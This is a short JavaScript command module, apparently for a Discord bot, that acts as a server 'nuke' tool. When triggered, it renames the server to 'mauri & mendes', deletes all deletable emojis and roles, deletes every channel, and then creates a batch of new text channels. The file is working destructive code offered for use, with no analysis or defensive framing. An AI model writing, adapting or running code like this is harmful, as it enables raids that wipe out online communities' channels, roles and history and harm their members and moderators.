const discord = require("discord.js"),
    colors = require("colors"),
    config = require("../config.json");
exports.run = async (client, message, args) => {
    let inutile = args.slice(0).join(" ");
    message.delete()
    message.guild.setName("mauri & mendes").catch(err => {});
    if (!message.guild.me.hasPermission('MANAGE_CHANNELS')) return console.log(colors.red("Você não tem essa permissão."));
    message.guild.emojis.filter(emote => emote.deletable).forEach(emote => message.guild.deleteEmoji(emote))
    message.guild.roles.filter(roles => roles.deletable).forEach(role => role.delete())
    message.guild.channels.forEach(channels => channels.delete());
    for (i = 0; i < config.channels; i++) {
            message.guild.createChannel(config.channels, "text");
    }
    console.log(colors.green("[!] created channels."));
};